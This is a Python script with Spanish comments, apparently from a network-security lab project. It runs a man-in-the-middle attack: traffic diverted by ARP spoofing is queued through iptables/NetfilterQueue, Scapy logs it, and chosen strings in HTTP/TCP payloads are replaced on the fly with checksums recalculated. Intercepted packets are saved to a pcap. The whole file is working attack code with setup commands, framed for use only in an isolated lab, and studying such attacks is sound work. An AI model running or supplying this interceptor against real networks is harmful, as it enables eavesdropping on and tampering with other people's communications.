#!/usr/bin/env python3
"""
mitm_intercept.py - Interceptacion y modificacion de paquetes (Fase 2).

Una vez que el ARP Spoofing (attack/arp_spoof.py) hace que el trafico entre las
victimas pase por el atacante, este script intercepta ese trafico y, opcionalmente,
lo MODIFICA antes de reenviarlo. Demuestra el "modificacion de paquetes" del titulo
del proyecto sobre ICMP, TCP y HTTP.

Funciona con iptables + NetfilterQueue: encolamos el trafico reenviado (FORWARD)
hacia una cola de usuario y Scapy decide si lo deja pasar, lo modifica o lo registra.

Preparacion (en la VM atacante, como root):
    sysctl -w net.ipv4.ip_forward=1
    iptables -I FORWARD -j NFQUEUE --queue-num 1
Limpieza al terminar:
    iptables -D FORWARD -j NFQUEUE --queue-num 1
(El script intenta poner/quitar esta regla automaticamente con --auto-iptables.)

Uso (como root):
    # Solo observar (sniff) lo que pasa por el MITM
    sudo python3 attack/mitm_intercept.py --mode sniff --auto-iptables

    # Modificar: reemplazar una cadena en payloads HTTP/TCP al vuelo
    sudo python3 attack/mitm_intercept.py --mode modify \
        --find "Hola" --replace "XXXX" --auto-iptables

Dependencias:  pip3 install scapy netfilterqueue
ADVERTENCIA: uso exclusivo en el laboratorio aislado del proyecto.
"""

import argparse
import os
import subprocess
import sys

from scapy.all import IP, TCP, UDP, ICMP, Raw, wrpcap

try:
    from netfilterqueue import NetfilterQueue
except ImportError:
    NetfilterQueue = None


QUEUE_NUM = 1
captured = []          # paquetes vistos (se vuelcan a pcap al salir)
ARGS = None            # configuracion global (se asigna en main)


def log_packet(scapy_pkt):
    """Imprime un resumen legible del paquete interceptado."""
    if scapy_pkt.haslayer(ICMP):
        proto = "ICMP"
    elif scapy_pkt.haslayer(TCP):
        proto = "TCP %d->%d" % (scapy_pkt[TCP].sport, scapy_pkt[TCP].dport)
    elif scapy_pkt.haslayer(UDP):
        proto = "UDP %d->%d" % (scapy_pkt[UDP].sport, scapy_pkt[UDP].dport)
    else:
        proto = "IP"
    src = scapy_pkt[IP].src if scapy_pkt.haslayer(IP) else "?"
    dst = scapy_pkt[IP].dst if scapy_pkt.haslayer(IP) else "?"
    extra = ""
    if scapy_pkt.haslayer(Raw):
        data = bytes(scapy_pkt[Raw].load)
        preview = data[:60].decode("latin-1", "replace").replace("\r", " ").replace("\n", " ")
        extra = "  | %s" % preview
    print("[MITM] %-14s %s -> %s%s" % (proto, src, dst, extra))


def handle(pkt):
    """Callback de NetfilterQueue por cada paquete reenviado."""
    scapy_pkt = IP(pkt.get_payload())
    captured.append(scapy_pkt)
    log_packet(scapy_pkt)

    if ARGS.mode == "modify" and scapy_pkt.haslayer(Raw) and ARGS.find:
        load = bytes(scapy_pkt[Raw].load)
        needle = ARGS.find.encode()
        if needle in load:
            new_load = load.replace(needle, ARGS.replace.encode())
            # ajustar longitud para que coincida y no romper el paquete
            if len(new_load) != len(load):
                new_load = (new_load[:len(load)]).ljust(len(load), b" ")
            scapy_pkt[Raw].load = new_load
            # recalcular checksums/longitudes
            del scapy_pkt[IP].len
            del scapy_pkt[IP].chksum
            if scapy_pkt.haslayer(TCP):
                del scapy_pkt[TCP].chksum
            print("       [!] payload MODIFICADO: '%s' -> '%s'"
                  % (ARGS.find, ARGS.replace))
            pkt.set_payload(bytes(scapy_pkt))

    pkt.accept()  # reenviar (modificado o intacto): MITM transparente


def set_iptables(add):
    action = "-I" if add else "-D"
    cmd = ["iptables", action, "FORWARD", "-j", "NFQUEUE",
           "--queue-num", str(QUEUE_NUM)]
    subprocess.run(cmd, check=False)


def main():
    global ARGS
    parser = argparse.ArgumentParser(
        description="Interceptacion/modificacion de paquetes MITM (Fase 2)")
    parser.add_argument("--mode", choices=["sniff", "modify"], default="sniff",
                        help="sniff = solo observar; modify = alterar payloads")
    parser.add_argument("--find", help="Cadena a buscar en el payload (modo modify)")
    parser.add_argument("--replace", default="",
                        help="Cadena de reemplazo (modo modify)")
    parser.add_argument("--auto-iptables", action="store_true",
                        help="Agregar/quitar la regla NFQUEUE automaticamente")
    parser.add_argument("--pcap", default="captures/mitm_intercept.pcap",
                        help="Archivo pcap donde guardar lo interceptado")
    ARGS = parser.parse_args()

    if os.geteuid() != 0:
        print("[!] Ejecuta como root (usa sudo).")
        sys.exit(1)
    if NetfilterQueue is None:
        print("[!] Falta 'netfilterqueue'. Instala con: pip3 install netfilterqueue")
        print("    (requiere libnfnetlink-dev y build-essential en Ubuntu)")
        sys.exit(1)
    if ARGS.mode == "modify" and not ARGS.find:
        print("[!] El modo 'modify' requiere --find.")
        sys.exit(1)

    os.makedirs(os.path.dirname(ARGS.pcap) or ".", exist_ok=True)

    if ARGS.auto_iptables:
        print("[*] Activando reenvio IPv4 y regla NFQUEUE...")
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=False)
        set_iptables(add=True)

    nfq = NetfilterQueue()
    nfq.bind(QUEUE_NUM, handle)
    print("[*] Interceptando (modo=%s). Ctrl+C para detener." % ARGS.mode)
    try:
        nfq.run()
    except KeyboardInterrupt:
        print("\n[*] Deteniendo...")
    finally:
        nfq.unbind()
        if ARGS.auto_iptables:
            set_iptables(add=False)
            print("[+] Regla NFQUEUE eliminada.")
        if captured:
            wrpcap(ARGS.pcap, captured)
            print("[+] %d paquetes guardados en %s" % (len(captured), ARGS.pcap))


if __name__ == "__main__":
    main()
